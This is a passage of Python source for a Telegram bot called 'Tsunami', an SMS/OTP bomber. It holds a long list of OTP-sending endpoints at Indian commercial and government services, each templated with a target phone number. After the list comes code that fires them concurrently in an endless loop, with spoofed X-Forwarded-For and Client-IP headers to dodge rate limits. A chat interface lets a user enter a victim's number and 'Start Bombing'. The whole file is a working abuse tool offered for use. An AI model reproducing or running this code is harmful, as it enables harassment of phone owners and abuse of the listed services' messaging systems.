    E.append({"name":"BajajAllianz","method":"POST","url":"https://www.bajajallianz.com/api/v2/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"TataAIG","method":"POST","url":"https://www.tataaig.com/api/v2/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"RelianceGeneral","method":"POST","url":"https://www.reliancegeneral.co.in/api/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Netmeds","method":"POST","url":"https://www.netmeds.com/api/v2/auth/login/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"1mg_SMS","method":"POST","url":"https://www.1mg.com/auth_api/v6/create_token","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"number":"{t}"}'})
    E.append({"name":"Apollo_Pharmacy","method":"POST","url":"https://www.apollopharmacy.in/api/v2/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"MedPlus","method":"POST","url":"https://www.medplusmart.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Practo","method":"POST","url":"https://www.practo.com/api/v2/auth/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"DocsApp","method":"POST","url":"https://www.docsapp.in/api/v2/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Tata_1mg_Health","method":"POST","url":"https://www.1mg.com/auth_api/v6/send_otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"number":"{t}","sendOtpType":"sms"}'})
    E.append({"name":"HealthKart","method":"POST","url":"https://www.healthkart.com/api/customer/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"PharmEasy_2","method":"POST","url":"https://pharmeasy.in/api/v3/auth/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"BYJUS","method":"POST","url":"https://api.byjus.com/api/v2/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Unacademy","method":"POST","url":"https://unacademy.com/api/v2/user/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Vedantu","method":"POST","url":"https://api.vedantu.com/api/v1/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Toppr","method":"POST","url":"https://api.toppr.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"UpGrad","method":"POST","url":"https://api.upgrad.com/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"PhysicsWallah","method":"POST","url":"https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}","countryCode":"+91"}'})
    E.append({"name":"Doubtnut","method":"POST","url":"https://api.doubtnut.com/v4/student/login","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone_number":"{t}","language":"en"}'})
    E.append({"name":"CareerWill","method":"POST","url":"https://careerwill.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Examturf","method":"POST","url":"https://api.examturf.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Uber_IN","method":"POST","url":"https://auth.uber.com/v2/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Ola","method":"POST","url":"https://api.olacabs.com/v2/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"BluSmart","method":"POST","url":"https://blusmart.com/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"NammaYatri","method":"POST","url":"https://api.nammayatri.in/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Meru_Cabs","method":"POST","url":"https://merucabapp.com/api/otp/generate","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"mobile_number={t}"})
    E.append({"name":"Savaari","method":"POST","url":"https://www.savaari.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Zoomcar","method":"POST","url":"https://www.zoomcar.com/api/v2/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Drivezy","method":"POST","url":"https://www.drivezy.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Hotstar","method":"POST","url":"https://api.hotstar.com/r9/v1/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","countryCode":"IN"}'})
    E.append({"name":"Zee5","method":"POST","url":"https://www.zee5.com/api/v1/sendOTP","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Voot","method":"POST","url":"https://api.voot.com/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"SonyLiv","method":"POST","url":"https://www.sonyliv.com/api/v1/auth/sendOTP","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","countryCode":"+91"}'})
    E.append({"name":"MXPlayer","method":"POST","url":"https://api.mxplayer.in/v1/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"JioCinema","method":"POST","url":"https://api.jiocinema.com/v1/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"AirtelXstream","method":"POST","url":"https://www.airtelxstream.in/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Gaana","method":"POST","url":"https://api.gaana.com/user/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Wynk","method":"POST","url":"https://api.wynk.in/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Hungama","method":"POST","url":"https://api.hungama.com/user/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Dream11","method":"POST","url":"https://api.dream11.com/api/v2/user/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"MPL","method":"POST","url":"https://api.mpl.live/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"RummyCircle_2","method":"POST","url":"https://www.rummycircle.com/api/fl/auth/v3/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"PokerBaazi","method":"POST","url":"https://api.pokerbaazi.com/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Adda52","method":"POST","url":"https://www.adda52.com/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"My11Circle","method":"POST","url":"https://api.my11circle.com/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"WinZO","method":"POST","url":"https://api.winzo.com/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Zupee","method":"POST","url":"https://api.zupee.com/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Loco","method":"POST","url":"https://api.loco.gg/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Stake_India","method":"POST","url":"https://api.stake.com/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Naukri","method":"POST","url":"https://www.naukri.com/api/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Indeed","method":"POST","url":"https://in.indeed.com/api/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"LinkedIn","method":"POST","url":"https://www.linkedin.com/api/v2/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Shine","method":"POST","url":"https://www.shine.com/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Internshala","method":"POST","url":"https://internshala.com/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Hirect","method":"POST","url":"https://api.hirect.in/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"ApnaJobs","method":"POST","url":"https://production.apna.co/api/userprofile/v2/otp/","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone_number":"91{t}"}'})
    E.append({"name":"WorkIndia","method":"POST","url":"https://api.workindia.in/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Quikr","method":"POST","url":"https://www.quikr.com/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"OLX_Jobs","method":"POST","url":"https://www.olx.in/api/auth/jobs/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Cars24","method":"POST","url":"https://www.cars24.com/api/v2/auth/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"CarDekho","method":"POST","url":"https://www.cardekho.com/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"CarWale","method":"POST","url":"https://www.carwale.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Spinny","method":"POST","url":"https://api.spinny.com/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Droom_2","method":"POST","url":"https://api.droom.in/v2/user/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"MagicBricks","method":"POST","url":"https://www.magicbricks.com/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"99acres","method":"POST","url":"https://www.99acres.com/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"NoBroker_2","method":"POST","url":"https://www.nobroker.in/api/v4/account/otp/send","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"phone={t}&countryCode=IN"})
    E.append({"name":"Housing","method":"POST","url":"https://login.housing.com/api/v2/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","country_url_name":"in"}'})
    E.append({"name":"PropTiger","method":"POST","url":"https://www.proptiger.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Purplle","method":"POST","url":"https://www.purplle.com/api/v2/auth/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Nykaa_Fashion_2","method":"POST","url":"https://www.nykaafashion.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"MamaEarth_SMS","method":"POST","url":"https://auth.mamaearth.in/v1/auth/sms-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"PlumGoodness","method":"POST","url":"https://www.plumgoodness.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"WOWSkin","method":"POST","url":"https://www.wowskin.in/api/customer/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Biotique","method":"POST","url":"https://www.biotique.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Sirona","method":"POST","url":"https://www.sirona.in/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Cultfit","method":"POST","url":"https://www.cult.fit/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"HealthifyMe","method":"POST","url":"https://api.healthifyme.com/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Fittr","method":"POST","url":"https://api.fittr.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"FitPass","method":"POST","url":"https://api.fitpass.co/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Zenoti","method":"POST","url":"https://api.zenoti.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Netflix_IN","method":"POST","url":"https://www.netflix.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Spotify_IN","method":"POST","url":"https://api.spotify.com/v1/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"YouTube_IN","method":"POST","url":"https://www.youtube.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"UMANG","method":"POST","url":"https://web.umang.gov.in/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"DigiLocker","method":"POST","url":"https://api.digilocker.gov.in/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"IncomeTax","method":"POST","url":"https://www.incometax.gov.in/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"PassportSeva","method":"POST","url":"https://www.passportindia.gov.in/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"EPFO","method":"POST","url":"https://www.epfindia.gov.in/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Airtel","method":"POST","url":"https://www.airtel.in/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Jio","method":"POST","url":"https://www.jio.com/api/jio-login-service/login/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}","loginFlowType":"MOBILE","alternateNumber":""}'})
    E.append({"name":"Vi","method":"POST","url":"https://www.myvi.in/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"BSNL","method":"POST","url":"https://portal.bsnl.in/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Steam_IN","method":"POST","url":"https://store.steampowered.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"EpicGames_IN","method":"POST","url":"https://www.epicgames.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"GooglePlay","method":"POST","url":"https://play.google.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Porter","method":"POST","url":"https://api.porter.in/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Delhivery","method":"POST","url":"https://www.delhivery.com/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"BlueDart","method":"POST","url":"https://www.bluedart.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"DTDC","method":"POST","url":"https://www.dtdc.in/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Shadowfax","method":"POST","url":"https://api.shadowfax.in/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"EcomExpress","method":"POST","url":"https://api.ecomexpress.in/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"XpressBees","method":"POST","url":"https://api.xpressbees.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Zomato_Gold","method":"POST","url":"https://www.zomato.com/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Swiggy_Instamart","method":"POST","url":"https://www.swiggy.com/api/instamart/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Swiggy_Genie","method":"POST","url":"https://www.swiggy.com/api/genie/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"EatSure","method":"POST","url":"https://www.eatsure.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Biryani_By_Kilo","method":"POST","url":"https://www.biryanibykilo.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"WowMomo_2","method":"POST","url":"https://www.wowmomo.com/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"TataPower_EZ","method":"POST","url":"https://www.tatapower.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"ChargeZone","method":"POST","url":"https://api.chargezone.in/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Statiq","method":"POST","url":"https://api.statiq.in/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"IndianOil","method":"POST","url":"https://www.iocl.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"HPGas","method":"POST","url":"https://www.hpgas.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Indane","method":"POST","url":"https://www.indane.co.in/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Practo_2","method":"POST","url":"https://www.practo.com/api/v3/auth/send-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"UrbanCompany","method":"POST","url":"https://www.urbancompany.com/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Housejoy","method":"POST","url":"https://www.housejoy.in/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Zopper","method":"POST","url":"https://www.zopper.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"BookMyShow","method":"POST","url":"https://in.bookmyshow.com/auth/send/otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"PVR","method":"POST","url":"https://www.pvrcinemas.com/api/v2/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"INOX","method":"POST","url":"https://www.inoxmovies.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})
    E.append({"name":"Cinepolis","method":"POST","url":"https://www.cinepolisindia.com/api/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}"}'})

    # ==========================================
    # 4. TSUNAMI CORE APIS
    # ==========================================
    E.append({"name":"Tsunami_Hotstar","method":"PUT","url":"https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp","headers":{"Host":"api.hotstar.com","user-agent":UA_C2,"content-type":"application/json","x-hs-platform":"PCTV","x-country-code":"IN"},"data":'{"phone_number":"{t}","country_prefix":"91"}'})
    E.append({"name":"AltBalaji","method":"POST","url":"https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN","headers":{"Accept":"application/json","User-Agent":UA_C2,"Content-Type":"application/json"},"data":'{"phone_number":"{t}","country_code":"91","platform":"web","exp":1601043289127}'})
    E.append({"name":"Tsunami_Voot","method":"POST","url":"https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser","headers":{"accept":"application/json","user-agent":UA_C2,"content-type":"application/json"},"data":'{"type":"mobile","mobile":"{t}","countryCode":"+91"}'})
    E.append({"name":"Tsunami_Zomato","method":"POST","url":"https://www.zomato.com/webroutes/auth/login","headers":{"user-agent":UA_C2,"content-type":"application/json","accept":"*/*"},"data":'{"country_id":1,"phone":"{t}","verification_type":"sms","method":"phone"}'})
    E.append({"name":"Tsunami_Flipkart","method":"POST","url":"https://1.rome.api.flipkart.com/1/action/view","headers":{"user-agent":UA_C2,"content-type":"application/json","Accept":"*/*"},"data":'{"actionRequestContext":{"type":"LOGIN_IDENTITY_VERIFY","loginIdPrefix":"+91","loginId":"{t}","loginType":"MOBILE","verificationType":"OTP"}}'})

    return E

ENDPOINTS = build_endpoints()

# ================== HTTP SESSION ==================
async def get_http_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(limit=100, limit_per_host=20, ssl=False)
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        _http_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
    return _http_session

async def fire_endpoint(ep: dict, target: str) -> bool:
    url = ep["url"].replace("{t}", target)
    spoof = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    headers = {k: v.replace("{t}", target) for k, v in ep["headers"].items()}
    headers["X-Forwarded-For"] = spoof
    headers["Client-IP"] = spoof
    headers["X-Request-Id"] = uuid.uuid4().hex

    data = ep["data"]
    if isinstance(data, str):
        data = data.replace("{t}", target)
        
    try:
        session = await get_http_session()
        async with session.request(method=ep["method"], url=url, headers=headers, data=data if data else None, ssl=False) as resp:
            await resp.read()
            return resp.status in (200, 201, 202)
    except Exception:
        return False

async def _fire_batch(batch, target):
    tasks = [fire_endpoint(ep, target) for ep in batch]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return sum(1 for r in results if r is True)

# ================== BUTTON HANDLERS ==================
async def start_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("🚀 Start Bombing", callback_data="start_bomb")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    text = "🌊 **TSUNAMI ULTRA FAST** 🌊\n\nClick below to begin."
    await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")

async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id

    if query.data == "start_bomb":
        user_sessions[uid] = {"state": "awaiting_target", "running": False}
        await query.message.edit_text("📱 Send target number (10 digits, no +91):")
    
    elif query.data == "stop_bomb":
        s = user_sessions.get(uid)
        if s and s.get("running"):
            s["running"] = False
            s["cancelled"] = True
            await query.message.edit_text("🛑 **Stopping...**", parse_mode="Markdown")

# ================== TEXT HANDLER ==================
async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text.strip()
    s = user_sessions.get(uid)
    
    if not s or s.get("state") != "awaiting_target":
        return
        
    if not is_valid_target(text):
        await update.message.reply_text("❌ Invalid. 10 digits starting with 6/7/8/9.")
        return

    s.update(target=text, state="running", running=True, cancelled=False, sent=0, round=0, started_at=time.time())
    
    keyboard = [[InlineKeyboardButton("🛑 Stop Bombing", callback_data="stop_bomb")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"🔥 **BOMBING STARTED** 🔥\n\n🎯 Target: `{text}`\n🔌 Endpoints: {len(ENDPOINTS)}\n⚡ Status: Ultra Fast Mode...",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )
    
    asyncio.create_task(run_bombing(uid, s))

# ================== BOMBING LOGIC (ULTRA FAST CONTINUOUS) ==================
async def run_bombing(uid: int, s: dict):
    target = s["target"]
    sent = 0
    start = time.time()
    idx = 0
    
    try:
        while s.get("running"):
            s["round"] += 1
            batch = []
            for _ in range(CONCURRENCY):
                batch.append(ENDPOINTS[idx % len(ENDPOINTS)])
                idx += 1

            ok = await _fire_batch(batch, target)
            sent += ok
            s["sent"] = sent
            
            if ok == 0:
                await asyncio.sleep(1.0) 
            else:
                await asyncio.sleep(DELAY)
                
    except Exception as e:
        logger.exception(f"Bombing error: {e}")
    finally:
        s["running"] = False

    try:
        bot = Bot(token=BOT_TOKEN)
        elapsed = int(time.time() - start)
        reason = "🛑 Stopped by you" if s.get("cancelled") else "✅ Done"
        await bot.send_message(uid, f"{reason}!\n\n📊 **Report for** `{target}`\n📨 Total Sent: *{sent}*\n⏱ Duration: {elapsed}s", parse_mode="Markdown")
    except Exception:
        pass

# ================== WEBHOOK & STARLETTE ==================
async def health(request): return PlainTextResponse("OK", status_code=200)
async def root(request): return PlainTextResponse("Tsunami Bot 🌊")

async def startup():
    global telegram_app
    if not WEBHOOK_URL: return
    webhook_path = f"/webhook/{BOT_TOKEN}"
    full_url = f"{WEBHOOK_URL}{webhook_path}"
    
    telegram_app = Application.builder().token(BOT_TOKEN).updater(None).build()
    telegram_app.add_handler(CommandHandler("start", start_cmd))
    telegram_app.add_handler(CallbackQueryHandler(button_handler))
    telegram_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    
    await telegram_app.initialize()
    await telegram_app.bot.set_webhook(url=full_url, allowed_updates=Update.ALL_TYPES)
    await telegram_app.start()
    logger.info(f"✅ Webhook set")

async def webhook(request):
    if telegram_app is None: return Response("not ready", status_code=503)
    try:
        data = await request.json()
        update = Update.de_json(data, telegram_app.bot)
        await telegram_app.process_update(update)
    except Exception as e: logger.exception(f"webhook error: {e}")
    return Response("ok")

async def shutdown():
    global _http_session, telegram_app
    if _http_session and not _http_session.closed: await _http_session.close()
    if telegram_app: await telegram_app.stop(); await telegram_app.shutdown()

def create_app() -> Starlette:
    routes = [Route("/", root), Route("/health", health), Route(f"/webhook/{BOT_TOKEN}", webhook, methods=["POST"])]
    return Starlette(routes=routes, on_startup=[startup], on_shutdown=[shutdown])

app = create_app()

if __name__ == "__main__":
    if not BOT_TOKEN: sys.exit(1)
    uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="info")
